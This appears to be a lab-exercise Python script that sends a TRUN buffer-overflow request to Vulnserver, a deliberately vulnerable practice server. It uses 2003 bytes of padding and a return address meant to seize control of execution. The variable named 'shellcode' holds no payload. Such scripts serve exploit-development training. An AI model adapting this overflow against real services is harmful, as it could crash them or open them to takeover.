#!/usr/bin/python3
import sys
import socket

ip = "192.168.25.150"
port = 9999

shellcode = b"C" * 2003 + b"\xaf\x11\x50\x62"

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    print("[*] Conectado al servidor")
    banner = sock.recv(1024)
    print(f"[*] Banner: {banner.decode()}")
    sock.sendall(b'TRUN /.:/' + shellcode)
    print("[*] Payload enviado")
    sock.close()
except ConnectionRefusedError:
    print("[-] Conexión rechazada - verifica que Vulnserver esté corriendo")
except socket.timeout:
    print("[-] Timeout")
except socket.error as e:
    print(f"[-] Error: Unable to establish connection with Server - {e}")
    sys.exit()
